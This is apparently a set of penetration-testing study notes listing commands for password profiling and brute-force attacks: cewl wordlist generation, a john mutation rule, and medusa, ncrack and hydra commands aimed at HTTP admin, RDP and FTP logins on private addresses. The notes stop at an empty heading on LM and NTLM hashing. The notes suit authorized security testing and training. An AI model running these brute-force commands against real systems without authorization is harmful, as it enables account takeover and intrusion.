# information gathering / enumeration
## Password Profiling
### cewl 
Building list of possible passwords based on the a website keywords.
- `cewl www.targetdomain.com -m 6 -w /root/target-dmoain-cewl.txt`

### john (the ripper)
We'll use it to mutate an existing password list.
- config file `/etc/john/john.conf`
- add a new line right inside the `# Wordlist mode rules` section/block
```
# Add two numbers to the end of each password
$[0-9]$[0-9]
```  
- `john --wordlist=/root/target-dmoain-cewl.txt --rules --stdout > mutated.txt`

### medusa (brute force attack)
HTTP attack on port: 80, user: admin, directory: admin, threads: 20
- `medusa -h 192.168.31.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 20`

### ncrack (brute force)
Can brute force windows RDP protocol.
- `ncrack -v -f --user administrator -P password-file.txt rdp://192.168.31.233,CL=1`

### hydra (brute force)
Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
- ftp example. `hydra -l admin -P password-file.txt -v 192.168.31.219 ftp`

## Password Cracking
### LM and NTLM hashing
In memory attacks
